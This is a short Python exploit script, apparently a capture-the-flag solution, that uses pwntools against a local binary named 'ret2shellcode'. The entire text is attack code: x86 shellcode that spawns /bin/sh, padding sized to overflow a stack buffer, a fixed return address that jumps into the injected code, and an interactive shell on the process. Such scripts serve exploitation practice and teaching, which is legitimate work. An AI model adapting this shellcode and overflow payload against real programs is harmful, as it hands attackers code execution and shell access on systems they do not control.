from pwn import *

shellcode = b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
padding_len = 0x6c+4
retaddr = 0x0804A080
payload = shellcode + b'q'*(padding_len - len(shellcode)) + p32(retaddr)

sh = process('./ret2shellcode')
sh.sendline(payload)
sh.interactive()
